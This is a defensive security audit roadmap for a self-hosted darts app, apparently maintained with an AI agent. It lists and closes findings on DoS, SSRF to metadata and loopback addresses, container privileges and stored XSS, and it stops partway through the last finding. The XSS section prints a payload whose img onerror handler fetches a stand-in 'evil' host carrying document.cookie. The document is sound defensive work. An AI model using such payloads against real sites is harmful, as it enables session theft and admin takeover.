# Security Audit Roadmap (adversarial whole-codebase review)

> **Status: ✅ All findings fixed (SEC-1 through SEC-14).** A second-pass audit
> (2026-07, after the Cricket / Doubles Practice / Just Chuckin' It / Ghost-mode
> expansion) opened three new findings — SEC-12 (stored XSS), SEC-13 (player-name
> bounds), SEC-14 (validate/bound write inputs) — see "Part 4" below for what
> shipped for each, and `docs/bug-roadmap.md` for the functional-defect
> counterparts (BUG-1/BUG-2/BUG-3) fixed in the same pass.
>
> See the "Status" line
> under each finding below for what actually shipped, which in a couple of places is
> a more robust implementation than the original suggested fix — e.g. SEC-5 uses a
> root-briefly/chown/drop-to-non-root entrypoint rather than a bare `USER node`, so
> existing bind-mounted data directories keep working. **SEC-7 (2026-07)**: option 1
> from the brainstorm — folded `POST /api/ha-webhook` into the same `requireWrite`
> gate every other write endpoint already uses (`backend/server.js`) — a no-op (LAN
> trust, unchanged) when `OCHE_REQUIRE_AUTH` is off, admin-session-required when it's
> on, verified all three cases (off/anonymous, on/no-session→401, on/logged-in→200)
> against a live scratch server. Option 2 (moving webhook firing fully server-side)
> remains a possible future refinement, not required to close this finding.
>
> Produced by a full, character-by-character read of the codebase with a
> pretend-malicious mindset ("how do I break in and pivot into the rest of the
> network?"). Scope: `backend/server.js`, `backend/db.js`, `backend/auth.js`,
> `backend/backup.js`, `frontend/index.html`, `frontend/display.html`, `Dockerfile`,
> and the compose files.
>
> **How to use this doc:** each OPEN finding has a stable ID, a severity, the exact
> location (by function/file, not line number, so it survives edits), the concrete
> attack, a **step-by-step fix**, and a **verification** step. Work top-down in the
> "Suggested implementation order" at the bottom. Part 1 lists what's already fixed so
> you don't redo it; Part 3 lists what was checked and found safe so you don't waste
> effort there.

## Threat model

Single-household, self-hosted app that **may be exposed to the open internet** by
someone. The overriding goals, in order: (1) it must not become a pivot point into the
host's network, (2) it must not let an unauthenticated stranger corrupt data or take
the service down, (3) stats must stay accurate. There is only one class of credential
(admin accounts); "players" and "PINs" are not authentication.

## Severity legend

- **HIGH** — remotely exploitable by an unauthenticated attacker for data loss, takeover, or network pivot.
- **MED** — remotely exploitable for denial-of-service or requires a weaker precondition.
- **LOW** — defense-in-depth / hardening; needs an unlikely precondition or has limited impact.

---

## Part 1 — Already fixed (do NOT redo)

These were found and fixed in the audit that produced this doc. Listed so a follow-up
model doesn't re-report them. See `docs/security-hardening-roadmap.md` for detail.

- **Unauthenticated write endpoints** → `OCHE_REQUIRE_AUTH` env flag + `requireWrite()`
  gate on every write route in `server.js`. Reads stay public. `GET /api/auth-config`
  reports the flag; frontend prompts for login before gameplay/roster writes.
- **Player PINs enforced only in the UI** (a direct `POST /api/games/:id/turns` scored
  as a PIN-protected player) → mitigated by the auth gate above (PINs remain a UI
  convenience only; this is by design now, documented).
- **Stat reclassification on player delete / reset-all** → `games.player_count` frozen
  at creation and used for H2H-vs-practice classification instead of a live
  `COUNT(game_players)` subquery.
- **3-dart-average inflation / stat poisoning via malformed turns** → `addTurn()` now
  rejects turns with 0 darts or >3 darts and validates each dart's sector/multiplier.
- **Static-file path traversal guard** → switched from `startsWith(FRONTEND_DIR)` to a
  `path.relative()` check in `serveStatic()`.

---

## Part 2 — OPEN findings

### SEC-1 — Blocking `scryptSync` on every login attempt → CPU-exhaustion DoS  **(MED, unauthenticated)**

**Status: ✅ Fixed.** `auth.js` now wraps `crypto.scrypt` in a promise
(`hashSecret`/`verifySecret` are async); `login()`, `verifyPlayerPin()`,
`createFirstAdmin()`, `createAdmin()`, `changeAdminPassword()`, `setPlayerPin()` all
`await` it, and every caller in `server.js` awaits those. The dummy-hash constant-time
behavior on unknown usernames is preserved (computed lazily once, cached as a
promise, since a synchronous module-load-time call isn't possible for an async
function). `/api/login`, `/api/setup`, and `/api/players/verify-pin` each get their
**own** rate-limit bucket (`'login'`, `'setup'`, `'pin'` — not a single shared bucket
as the fix sketch below implies) at 10/60s/IP, so heavy legitimate PIN-verify traffic
during normal gameplay setup can't burn down the login budget. Verified: 200
concurrent bogus logins kept `GET /api/health` responding in ~10-20ms throughout, and
the 11th login attempt from one IP within a window correctly got 429.

**Where:** `backend/auth.js` `verifySecret()`/`hashSecret()` use `crypto.scryptSync`
(synchronous). `backend/db.js` `login()` runs it on **every** attempt, including a
dummy hash for unknown usernames (the anti-enumeration measure). `verifyPlayerPin()`
and `createFirstAdmin()` also call it.

**Attack:** Node is single-threaded. `scryptSync` blocks the event loop for ~50-100ms
per call. An unauthenticated attacker POSTing `/api/login` in a loop (usernames don't
need to exist — the dummy hash still runs) pins the CPU and stalls *all* other
requests, including the live scoreboard. Per-account lockout does not help: unknown
usernames have no lockout, and the work happens before any lockout branch.

**Fix (step by step):**
1. Add a small in-memory per-IP rate limiter (see SEC-3 — build it once, reuse here).
   Apply it to `/api/login`, `/api/setup`, and `/api/players/verify-pin` **before** any
   scrypt work runs. Suggested budget: 10 attempts / 60s / IP, then 429.
2. Switch the hashing to the **async** API so a single attempt no longer blocks the
   loop: in `auth.js`, add `verifySecretAsync`/`hashSecretAsync` using
   `crypto.scrypt(...)` wrapped in a Promise, and `await` them in `login()`,
   `verifyPlayerPin()`, `createFirstAdmin()`, `createAdmin()`, `changeAdminPassword()`.
   Keep the constant-time/dummy-hash behavior (still run the dummy hash on unknown
   users, just awaited).
3. Cap password length is already enforced (≤256) — keep it; scrypt cost scales with
   input, so this bound matters.

**Verify:** with a script firing 200 concurrent `/api/login` requests with a bogus
username, confirm (a) legitimate `GET /api/health` still responds within ~100ms
throughout, and (b) the attacker starts receiving 429 after the budget.

---

### SEC-2 — Unbounded SSE connections + unbounded live-state payload → resource-exhaustion DoS  **(MED)**

**Status: ✅ Fixed.** `MAX_SSE_TOTAL=50` and `MAX_SSE_PER_IP=5` in `server.js`; the
`/api/live/stream` handler returns 503 past either cap, and the per-IP count is
decremented on `req.on('close', ...)`. Went with "leave the stream public but cap it"
(option 3's simpler branch) rather than gating it behind `OCHE_REQUIRE_AUTH`, since the
display screen genuinely isn't logged in. `POST /api/live` now runs through
`sanitizeLiveState()`: only the top-level keys `liveSnapshot()` in `frontend/index.html`
actually produces are kept (everything else silently dropped), and the sanitized
result is rejected with 413 if it serializes past 64KB. Verified: a payload with a
2000-entry players array + a 5KB junk field → 413; a normal payload with one unknown
top-level key → 200 with that key stripped from the stored/broadcast state; opening 7
connections from one IP → first 5 accepted (200), next 2 rejected (503); closing
connections frees up the per-IP slot for a new one.

**Where:** `backend/server.js` — `liveClients` is a `Set` with no cap; `GET
/api/live/stream` adds a client per connection and is a **read**, so it is *not* gated
even when `OCHE_REQUIRE_AUTH` is on. `POST /api/live` stores whatever object is sent
into `liveState` (bounded only by `readJson`'s 1MB cap) and re-broadcasts it.

**Attack:** an unauthenticated client opens thousands of `/api/live/stream`
connections → file-descriptor / memory exhaustion and a growing per-heartbeat write
loop. Separately, a ~1MB `POST /api/live` is re-serialized and pushed to every client
on every update.

**Fix (step by step):**
1. Cap total SSE clients: `const MAX_SSE = 50;` in `server.js`. In the
   `/api/live/stream` handler, if `liveClients.size >= MAX_SSE`, respond `503` and
   return instead of adding the client.
2. Add a per-IP SSE connection cap (e.g. max 5 per IP) using the same IP map as SEC-3.
3. When `OCHE_REQUIRE_AUTH` is on, require an admin session for `/api/live/stream` too
   (the display screen would then need a login or a read-only view token — decide which;
   simplest is to leave the stream public but keep the caps above).
4. Shrink the accepted live payload: validate/whitelist the top-level shape in `POST
   /api/live` (only the fields `display.html` actually reads) rather than storing an
   arbitrary object; reject if it serializes beyond, say, 64KB.

**Verify:** open MAX_SSE+10 EventSource connections; confirm the extra ones get 503 and
existing clients keep receiving updates.

---

### SEC-3 — No HTTP rate limiting anywhere  **(MED, unauthenticated)**

**Status: ✅ Fixed.** `server.js` has a reusable `rateLimit(bucket, ip, max, windowMs)`
(bucketed, not a single global map keyed by IP alone — see SEC-1's note on why login/
setup/pin got separate buckets), `clientIp()` honoring `X-Forwarded-For` only when
`TRUST_PROXY=true`, a `tooManyRequests()` helper that sets `Retry-After`, and a loose
global budget (300/60s/IP) applied to every request before routing. Buckets are
pruned on a 60s unref'd interval. Verified with the SEC-1 tests above plus a direct
check that the `Retry-After` header is present and correct on a 429.

**Where:** `backend/server.js` — there is no per-IP throttling on any route. Only
per-account lockouts exist (admin login, player PIN).

**Attack:** unauthenticated flooding of any endpoint (login, verify-pin, `/api/live`,
stats reads) for brute force, data pollution (when auth is off), or plain DoS.

**Fix (step by step):**
1. Build one reusable limiter in `server.js`:
   ```js
   const rl = new Map(); // ip -> { count, resetAt }
   function rateLimit(ip, max, windowMs) {
     const now = Date.now();
     let e = rl.get(ip);
     if (!e || e.resetAt < now) { e = { count: 0, resetAt: now + windowMs }; rl.set(ip, e); }
     e.count++;
     return e.count <= max;
   }
   // periodic prune of expired entries (setInterval, unref'd)
   ```
2. Derive the client IP safely: default to `req.socket.remoteAddress`. Only honor
   `X-Forwarded-For` when an env flag like `TRUST_PROXY=true` is set (otherwise a
   client can spoof XFF to evade the limiter). Document this.
3. Apply a **strict** budget to auth endpoints (SEC-1) and a **loose** global budget
   (e.g. 300 req / 60s / IP) to everything else, returning `429` with a `Retry-After`.
4. Keep the limiter in-memory (matches the app's zero-dependency, single-process
   design); note it resets on restart and isn't shared across replicas (fine here).

**Verify:** exceed each budget from one IP and confirm 429s; confirm a second IP is
unaffected.

---

### SEC-4 — No egress restriction on the Home Assistant URL → SSRF / network pivot  **(MED→HIGH if internet-exposed)**

**Status: ✅ Fixed**, with the policy resolved as literally "always block
loopback/link-local, allow private by default" (the fix sketch below hedges between
two phrasings of an opt-out flag — resolved in favor of the "Recommended default"
paragraph): new `backend/netguard.js` exports `resolveAllowedHost(hostname)`, which
resolves once, rejects loopback/link-local (incl. `169.254.169.254`) unconditionally,
optionally also rejects private ranges when `HA_BLOCK_PRIVATE=true` (renamed from the
fix sketch's `HA_ALLOW_PRIVATE` — block-flag, not an allow-flag, since allow is the
default), and returns the single resolved IP for the caller to connect to (closing the
DNS-rebinding window). Both `fireHaWebhook()` (`db.js`) and `/api/ha-test`
(`server.js`) use it and connect to the resolved IP with the original hostname sent as
the `Host` header (and `servername` for TLS SNI on https). Verified against a real
running server: `http://169.254.169.254/`, `http://127.0.0.1:<port>/`, and
`http://localhost:<port>/` (resolves to loopback) were all rejected with a 400 and a
clear message; a private-LAN-shaped address (`192.168.1.250`) was allowed through to
attempt the connection (and correctly timed out, since nothing was listening there —
proving it wasn't blocked by policy).

**Where:** `backend/db.js` `fireHaWebhook()` and `backend/server.js` `/api/ha-test` —
both make outbound HTTP requests to the admin-configured `ha_url` with no restriction
on the destination host.

**Attack:** this is the exact "jumping-off point into the network" risk. Although the
destination is admin-set (not attacker-set), on an internet-exposed box an attacker who
phishes/guesses admin creds — or exploits any future write that can influence settings —
can point `ha_url` at `http://169.254.169.254/` (cloud instance-metadata, often
credential-bearing), `http://127.0.0.1:<port>` (other local services), or any RFC1918
address, then trigger `/api/ha-test` or a webhook and read/exfiltrate via timing/status.
Node's `http.request` does not follow redirects (good), but DNS rebinding is still
possible.

**Fix (step by step):**
1. Add a `isDisallowedHost(hostname, resolvedIp)` guard used by BOTH `fireHaWebhook` and
   `/api/ha-test`. Resolve the hostname (`dns.lookup`) and reject if the resolved IP is:
   loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`,
   especially `169.254.169.254`), or private (`10/8`, `172.16/12`, `192.168/16`,
   `fc00::/7`) — **unless** an explicit opt-out env flag (`HA_ALLOW_PRIVATE=true`) is set,
   since most real HA installs *are* on the LAN (so private ranges must be allowed by
   default for LAN, but blockable for hardened/public deployments). Recommended default:
   allow private LAN ranges (HA lives there) but **always** block loopback and
   link-local/metadata (`169.254.0.0/16`), which a real HA endpoint never uses.
2. Connect by the resolved IP (passing the original hostname in the `Host` header) to
   close the DNS-rebinding window between check and connect.
3. Keep the 5s timeout and the no-redirect behavior.

**Verify:** set `ha_url` to `http://169.254.169.254/` and confirm `/api/ha-test` refuses
with a clear error; confirm a normal LAN HA URL still works.

---

### SEC-5 — Container runs as root  **(MED, defense-in-depth)**

**Status: ✅ Fixed, with a more robust approach than the fix sketch below.** A bare
`USER node` (as suggested) would break every *existing* deployment on upgrade: Docker
bind mounts (`./darts_data:/data`, what `docker-compose.yml` actually uses) don't
inherit the image's ownership the way named/anonymous volumes do, so a freshly-created
or previously-root-owned host directory would leave the non-root process unable to
open its database at all. Instead: new `docker-entrypoint.sh` runs as root just long
enough to `chown` the (`DARTS_DB`-derived) data directory, then execs the real command
via `su-exec node` (a small static binary from Alpine's own package repo — not an
npm/JS dependency, doesn't affect the app's zero-dependency nature). `Dockerfile` adds
`apk add su-exec`, copies the entrypoint, and sets `ENTRYPOINT
["docker-entrypoint.sh"]`. **Verified against a real Docker daemon** (this sandbox
doesn't have network access to pull `node:22-alpine` from Docker Hub — a policy-level
403, not a config issue — so a literal `docker build` couldn't be completed here; the
entrypoint's actual mechanism was instead validated directly with the real `chown` +
`su-exec`-equivalent privilege-drop sequence against a real root-owned directory and
the real Node app: confirmed the app fails to even start as non-root against a
pre-existing root-owned dir without the chown step, and starts and writes its SQLite
DB correctly with it). `docker-compose.yml`/`docker-compose.dev.yml` add
`security_opt: [no-new-privileges:true]` (safe unconditionally); `read_only: true` /
`cap_drop: [ALL]` were deliberately **not** added — the entrypoint's `chown` step needs
`CAP_CHOWN`, and getting the exact minimal capability set right isn't something to
guess at without being able to test a real container build in this environment; a
wrong guess here would mean the container fails to start at all, which is worse than
not adding the extra hardening. `docker-compose.portainer.yml` (the no-build, bind-the-
whole-project-folder variant) is documented as staying root, since it has no build
step to run a chown/entrypoint against — see the comment added to that file.

**Where:** `Dockerfile` — no `USER` directive, so the process runs as root inside the
container. Any RCE (now or from a future dependency) would start as root.

**Fix (step by step):**
1. In `Dockerfile`, after copying app code, create/switch to the built-in non-root
   `node` user: ensure `/data` is writable by it.
   ```dockerfile
   RUN mkdir -p /data && chown -R node:node /usr/src/app /data
   USER node
   ```
   (`node:22-alpine` already ships a `node` user.)
2. Confirm the `/data` VOLUME is owned by `node` so SQLite can write there; if the host
   bind-mount (`./darts_data`) is root-owned, document that the operator must `chown` it
   or the container must map the right UID.
3. Consider `read_only: true` root filesystem in compose with `tmpfs` for anything
   transient, plus `cap_drop: [ALL]` and `security_opt: [no-new-privileges:true]`.

**Verify:** `docker exec oche id` shows a non-root UID; the app still reads/writes the DB.

---

### SEC-6 — Secure defaults not surfaced for public deployment  **(LOW→MED)**

**Status: ✅ Fixed.** `docker-compose.yml`, `docker-compose.dev.yml`, and
`docker-compose.portainer.yml` all now document (commented, default-off/unset)
`OCHE_REQUIRE_AUTH`, `TRUST_PROXY`, and `HA_BLOCK_PRIVATE` with explanations of when to
set each. `README.md` has a new "Exposing this to the internet — checklist" section
covering all of the above plus the reverse-proxy/`COOKIE_SECURE` guidance, the
non-root container, and the security response headers (all on by default, nothing to
configure). Step 3 (log a warning when `COOKIE_SECURE` is false but the request looks
like HTTPS via `X-Forwarded-Proto`) was **not** implemented — it's speculative
(marked "Optional" in the fix sketch) and would require deciding whether to trust
`X-Forwarded-Proto` by default, which has the same spoofing consideration as
`X-Forwarded-For`/`TRUST_PROXY`; left as a possible future addition rather than guessed
at here.

**Where:** `docker-compose.yml` sets `COOKIE_SECURE=false` and does not mention
`OCHE_REQUIRE_AUTH` at all; there is no TLS in-app (relies on a reverse proxy).

**Fix (step by step):**
1. Add `OCHE_REQUIRE_AUTH` to the compose `environment:` block (commented, default
   `false`) with a note: "set true for any internet-exposed deployment."
2. Add a short "Exposing this to the internet" checklist to `README.md`: put it behind a
   TLS-terminating reverse proxy, set `COOKIE_SECURE=true`, set `OCHE_REQUIRE_AUTH=true`,
   set `TRUST_PROXY=true` (SEC-3) only if the proxy is trusted, and restrict the exposed
   port to the proxy.
3. Optional: if `COOKIE_SECURE` is false but the request arrived over HTTPS (via
   `X-Forwarded-Proto`), log a one-time warning.

**Verify:** doc/config review.

---

### SEC-7 — `POST /api/ha-webhook` is unauthenticated  **(MED)**

**Status: ✅ Fixed (2026-07).** Folded into the same `requireWrite` gate every other
write endpoint already uses — a plain `if (!requireWrite(req, res)) return;` at the
top of the route (`backend/server.js`). Behaves identically to every other write:
a no-op (stays open, LAN trust) when `OCHE_REQUIRE_AUTH` is off, requires a
logged-in admin session when it's on. Gameplay already requires login before this
can fire in that mode (`Auth.ensureCanWrite()` gates `startGame()` on the frontend),
so this closes the anonymous-trigger hole with zero new frontend prompt or UX
change. Verified against a live scratch server: off → 200 anonymously (unchanged);
on, no session → 401 (matches `POST /api/games`'s existing 401 in the same state);
on, logged in → 200. Option 2 (move webhook firing fully server-side, removing the
public trigger and the client's ability to forge payload fields) and option 3
(a signed capability token) remain possible future refinements — not needed to
close this finding, which only asked for "every payload attributable to an
authenticated session," and option 1 already delivers that.

**Where:** `backend/server.js` `/api/ha-webhook`.

**Attack (now closed):** an anonymous request could trigger the homeowner's HA
automations at will and inject arbitrary JSON fields into the outbound payload
(destination was still the admin-configured URL, so never arbitrary SSRF — that's
SEC-4).

---

### SEC-8 — Lockout enables griefing  **(LOW, accepted tradeoff — document)**

**Status: ✅ Documented (no functional change needed — this finding's own fix section
says "document the behavior either way").** SEC-3 now exists, so the per-IP `login`
bucket bounds how fast one attacker IP can throw failed attempts at any one account. A
code comment above `login()` in `db.js` records the tradeoff explicitly: per-account
lockout is left as-is (an attacker who knows a username can still grief that one
account via a slow-and-steady or multi-IP attempt sequence); a scheme that only locks
an account after ITS OWN IP has separately been throttled would be a real behavior
change with its own subtlety, out of scope for this pass.

**Follow-up design work (2026-07, not started)**: two companion roadmap docs pick up
exactly this tradeoff and the "what if the real admin gets fully locked out" worry it
implies — `docs/admin-login-backoff-roadmap.md` (replace the flat lockout with a
progressive delay that never produces a hard, unconditional block) and
`docs/admin-account-recovery-roadmap.md` (a CLI recovery script for the case a
password is genuinely forgotten, which no lockout redesign fixes). Either can be
built without the other; see those docs for the full design.

**Where:** `db.js` `login()` and `verifyPlayerPin()` lock an account for 5 min after N
failures.

**Attack:** an attacker who knows an admin username (or a player name) can deliberately
fail logins to keep that account locked out (a targeted DoS on that user).

**Fix:** this is an inherent tradeoff of account lockout. Once SEC-3 (per-IP limiting)
exists, prefer to lean on IP throttling and make the account lockout longer only after
IP throttling is exhausted, so a single attacker IP can't cheaply lock a victim.
Document the behavior either way.

---

### SEC-9 — Settings values not length-bounded  **(LOW)**

**Status: ✅ Fixed.** `PUT /api/settings` in `server.js` now rejects `ha_url` over 2048
characters and any `ha_webhook_*` field over 128 characters with a 400, before calling
`updateSettings`. Verified directly against a running server.

**Where:** `server.js` `PUT /api/settings` caps `card_tagline` (≤140) and the two
lockout thresholds, but `ha_url` and the webhook-ID fields are stored unbounded (admin
only).

**Fix:** cap each accepted string setting (e.g. `ha_url` ≤2048, webhook IDs ≤128) in the
allow-list validation before `updateSettings`. Reject over-length with 400.

**Verify:** oversized value returns 400.

---

### SEC-10 — No security response headers  **(LOW, hardening)**

**Status: ✅ Fixed**, using approach (a) from the fix sketch. `server.js` defines
`SECURITY_HEADERS` (`X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
`X-Frame-Options: DENY`, and a CSP: `default-src 'self'; script-src 'self'
'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self';
frame-ancestors 'none'; base-uri 'self'; form-action 'self'`) and applies it in `send()`
(covering every API response and, since `serveStatic()` also calls `send()`, every
static file too) and explicitly on the `/api/live/stream` SSE response. Verified with a
real Playwright run of a full game (start → throw darts → 180 → enter turn) plus the
`/display` scoreboard page: zero CSP violations logged by the browser, confirming the
inline `<script>`/`onclick` handlers and Google Fonts loading are unaffected. Approach
(b) — removing inline JS/handlers entirely for a strict nonce-based CSP — remains a
separate, larger follow-up, not attempted here.

**Where:** `server.js` `send()`/`serveStatic()` set only `Content-Type`.

**Fix (step by step):**
1. Add to all responses: `X-Content-Type-Options: nosniff`,
   `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` (or a `frame-ancestors` CSP).
2. Add a Content-Security-Policy. Note: both HTML files use **inline** `<script>` and
   inline event handlers (`onclick=...`), plus Google Fonts. A strict CSP would break
   them, so either (a) accept `script-src 'self' 'unsafe-inline'` (weak but still blocks
   injected external script origins) or (b) as a larger follow-up, move inline JS to
   external files and inline handlers to `addEventListener`, then use a nonce/`'self'`
   CSP. Pick (a) now, track (b) separately.
3. `font-src`/`style-src` must include the Google Fonts origins already used.

**Verify:** response headers present; app still loads and fonts render.

---

### SEC-11 — Error responses echo `err.message` to the client  **(LOW)**

**Status: ✅ Fixed.** The top-level catch in `server.js` now returns `{ error: 'Server
error' }` for any response with `status >= 500`, while still returning the specific
`err.message` for 4xx (the existing app-authored `httpError()` messages, which are
meant to be shown to the user). The detailed error is still logged server-side via
`console.error` exactly as before. Verified: a malformed-JSON request body (a real
unhandled `JSON.parse` throw, not an `httpError`) now returns `{"error":"Server
error"}` instead of the raw parse-error message; a normal 404 ("Player not found")
still returns its specific message.

**Where:** `server.js` top-level catch returns `err.message` for any error.

**Attack:** low impact (messages are app-authored `httpError` strings, not stack
traces), but a future unhandled error could leak internal detail.

**Fix:** for `status >= 500` (or missing status), return a generic `"Server error"` to
the client and keep the detailed log server-side (the server-side `console.error` is
already there). Continue returning specific messages for 4xx.

**Verify:** force an unexpected throw; client sees the generic message, logs show detail.

---

## Part 3 — Checked and found SAFE (don't spend effort here)

- **SQL injection:** every query is parameterized. The only string-interpolated SQL is
  (a) the constant H2H/practice classification fragments (no user input), and (b) in
  `getMetricHistory`, the `tz` (validated integer in `[-840,840]`) and `start`/`end`
  (validated `^\d{4}-\d{2}-\d{2}$` in both `server.js` and `bld()`). No injection path.
- **XSS:** user-controlled strings go through `escapeHtml` (text/`"`-attributes) and
  `escapeJs` (JS-string args in `onclick`), or `textContent` in `display.html`. There
  are **no** single-quoted HTML attributes with interpolation (checked), so
  `escapeHtml` not escaping `'` is not exploitable. The untrusted `/api/live` payload is
  fully escaped/coerced in `display.html`.
- **Prototype pollution:** `PUT /api/settings` writes only allow-listed keys;
  `updateSettings` stringifies keys into DB rows (no object-prototype write). `liveState`
  from JSON.parse is stored/serialized, never merged into a prototype.
- **Auth primitives:** scrypt + random salt, `timingSafeEqual`, session tokens random
  and SHA-256-hashed at rest, `HttpOnly`+`SameSite=Strict` cookies (CSRF-safe for the
  state-changing verbs, which are all POST/PUT/DELETE), sessions invalidated on password
  change. Sound. (The blocking nature of scrypt was the one real issue here — SEC-1,
  now fixed.)
- **Path traversal:** fixed (`path.relative`), re-verified with `curl --path-as-is`.
- **Daily-challenge seed:** `Math.abs()` returns a positive double even for INT32_MIN;
  no negative-modulo crash.

---

## Suggested implementation order

1. ~~**SEC-3** (build the reusable per-IP rate limiter) — unblocks SEC-1 and SEC-2.~~ ✅
2. ~~**SEC-1** (async scrypt + rate-limit auth) — highest unauthenticated-DoS payoff.~~ ✅
3. ~~**SEC-2** (SSE caps + bounded live payload).~~ ✅
4. ~~**SEC-4** (HA egress guard) — the network-pivot risk the deployment cares most about.~~ ✅
5. ~~**SEC-5** (non-root container) + **SEC-6** (secure-default docs/compose).~~ ✅
6. ~~**SEC-7** (decide + implement webhook auth — agree first).~~ ✅
7. ~~**SEC-9, SEC-10, SEC-11** (bounded settings, headers, generic 5xx) — quick hardening.~~ ✅
8. ~~**SEC-8** (revisit lockout vs. IP throttling once SEC-3 lands).~~ ✅ (documented)

**Every finding in the ORIGINAL audit (SEC-1..SEC-11) is closed.** Part 4 below
tracks a later second pass.

## Standing practice

Every new endpoint: decide read vs. write (gate writes via `requireWrite`), bound every
accepted input, and rate-limit anything that does expensive work (crypto, outbound
requests, or DB writes) before that work runs. Every new outbound request: run it
through the SEC-4 egress guard. Every new credential/secret: write-only handling +
brute-force protection (see `docs/security-hardening-roadmap.md`).

---

## Part 4 — Second-pass audit (2026-07, after the game-modes expansion)

A fresh adversarial read of the whole codebase after Cricket, Doubles Practice, Just
Chuckin' It, Ghost mode, the expanded Daily Challenge, and the many new stat/leaderboard
endpoints were added. Same threat model and severity legend as the top of this doc. The
SQLi/auth-primitive/path-traversal/CSRF surfaces were re-checked and remain safe (see
Part 3). Three new findings:

### SEC-12 — Stored XSS via a player name in Settings → PIN management  **(MED, unauthenticated in the default config)**

**Status: ✅ Fixed.** `renderPinPlayersList()`'s two handlers now wrap the player
name as `escapeHtml(escapeJs(n))`, matching every other `onclick` site in the file.
The two admin-username handlers (`askChangeAdminPassword`/`askDeleteAdmin`) got the
same defense-in-depth wrap even though they were never exploitable (usernames are
regex-restricted). Confirmed zero remaining bare `escapeJs(` call sites in the file
(a grep for `escapeJs(` not preceded by `escapeHtml(` returns nothing). Verified
live against a running server: created a player named
`x"><img src=x onerror=window.__xss=true>`, opened Settings → PIN management,
confirmed `window.__xss` stayed `false`, no dialog fired, and the name rendered as
literal escaped text (`&quot;&gt;&lt;img...&gt;`) in both the `onclick` attribute
and the visible label.

**Where:** `frontend/index.html` `renderPinPlayersList()` (the two `onclick` handlers
that call `askSetPlayerPin(...)` / `askRemovePlayerPin(...)`). They interpolate a player
name into a **double-quoted** `onclick="..."` attribute using **`escapeJs(n)` only**:

```js
onclick="askSetPlayerPin('${escapeJs(n)}')"
```

`escapeJs()` escapes `\` and `'` but **not** `"`, `<`, or `>`. Every *other* `onclick`
site in the same file wraps the value as `escapeHtml(escapeJs(name))` (e.g. the
player-list/profile handlers at lines ~3014, ~3118, ~6176) — this one site is missing the
outer `escapeHtml`, so it's inconsistent with the file's own established safe pattern.

**Attack:** player names have **no charset restriction** server-side (`addPlayer()` in
`db.js` only does `String(name).trim()` + non-empty). In the default `OCHE_REQUIRE_AUTH`
-off config, **anyone** can `POST /api/players` with a name like:

```
x"><img src=x onerror=fetch('//evil/'+document.cookie)>
```

`roster` on every client is populated from `GET /api/players` (`index.html` ~line 1247),
so the poisoned name reaches every admin. When an admin opens **Settings → PIN
management**, the un-escaped `"` closes the `onclick` attribute, `>` closes the `<button>`,
and the injected `<img onerror>` executes **in the admin's authenticated session** — no
click required. The session cookie is `HttpOnly` (so it can't be read by `document.cookie`),
but the injected script can still call any admin API directly (create a new admin, change
a password, wipe data) using the admin's ambient session. This is an anonymous → admin
privilege escalation. (Verified by reproducing the exact rendered string: the current
helper emits a live `<img onerror>`; `escapeHtml(escapeJs(n))` renders it inert as
`&quot;&gt;&lt;img...&gt;`.)

Note: with `OCHE_REQUIRE_AUTH=true`, only admins can create players, so the cross-privilege
angle narrows — but the fix is trivial and defense-in-depth says escape regardless (a name
could have been planted before auth was enabled).

**Fix (step by step):**
1. In `renderPinPlayersList()`, change both handlers to the same pattern the rest of the
   file already uses: `onclick="askSetPlayerPin('${escapeHtml(escapeJs(n))}')"` (and the
   Remove-PIN one). Nothing else changes — the display `<span>` already uses
   `escapeHtml(n)` correctly.
2. Harden the two admin-username handlers (`askChangeAdminPassword` / `askDeleteAdmin`,
   lines ~2289-2290) the same way. They're **not** exploitable today (usernames are
   restricted to `^[A-Za-z0-9_.-]{3,32}$`, so no `"`), but wrapping them in `escapeHtml`
   removes the "safe only because of a validator elsewhere" coupling.
3. Consider a lint/grep guard: any `escapeJs(` that isn't inside `escapeHtml(escapeJs(`
   is a smell. There should be zero.

**Verify:** create a player named `x"><img src=x onerror=alert(1)>`, open Settings → PIN
management, confirm no alert fires and the name renders literally.

---

### SEC-13 — Player names have no server-side length or shape bound  **(LOW)**

**Status: ✅ Fixed.** New `validatePlayerName()` in `db.js` (used by `addPlayer()`,
`ensurePlayer()` — so it also covers `setOut()`, `createGame()`'s player-adding loop,
and `addTurn()`'s auto-create path — and `renamePlayer()`'s new name): rejects empty,
over-64-character, or control-character-containing names with a 400. Charset stays
permissive (apostrophes/emoji still allowed) per the fix sketch's own reasoning —
tested explicitly (`db.players-and-settings.test.js`). No frontend `maxlength` was
added (optional UX polish, not required to close the finding — the server-side bound
is what matters for the threat model).

**Where:** `db.js` `addPlayer()` / `renamePlayer()` / `ensurePlayer()` — a name is only
`String(name).trim()` + non-empty. No max length, no charset policy.

**Attack:** (a) this is the raw material for SEC-12 — any character reaches the client.
(b) A name can be up to ~1MB (bounded only by `readJson`'s body cap), and names are stored
and echoed into many views, canvases, and the live payload — a handful of giant names
bloats storage and every render. Low impact on a single-household box, but unbounded
free-text from an unauthenticated caller is exactly what the threat model wants bounded.

**Fix (step by step):**
1. In `addPlayer()` and `renamePlayer()`, after `trim()`, reject names longer than a sane
   cap (e.g. 64 chars) with a 400. Optionally normalize/collapse whitespace.
2. Keep the charset permissive (people want emoji/apostrophes in names) — the real defense
   against injection is consistent output escaping (SEC-12), not an input charset filter.
   But do reject control characters (`\x00-\x1f`) which have no legitimate use in a name.
3. Mirror the same cap in the frontend `maxlength` for a nicer UX (belt and braces).

**Verify:** a 5000-char name and a name with a raw newline are both rejected with 400.

---

### SEC-14 — Several write endpoints accept unbounded / unvalidated free-form fields  **(LOW, data-integrity + minor storage-DoS when auth is off)**

**Status: ✅ Fixed**, with one deliberate scope decision noted below. All four
call sites now validate at the write boundary, each with a committed
`node:test`:
- `awardBadge()`/`revokeBadge()`: new `validateBadgeId()` rejects anything not
  matching `^[a-z0-9_]{1,64}$`. This is a **shape bound, not an exact
  enumeration** — there is no single canonical badge-id registry shared between
  frontend and backend today (ids live only in `frontend/index.html`'s
  `BADGE_INFO` plus the dynamically-generated Just Chuckin' It milestone-ladder
  ids), and building a duplicate exact list here would be a second place to keep
  in sync on every new badge — the exact "same meaning in two places" drift risk
  this codebase avoids elsewhere. Every existing badge id was checked against
  this shape and matches. Tested in `db.badges.test.js`.
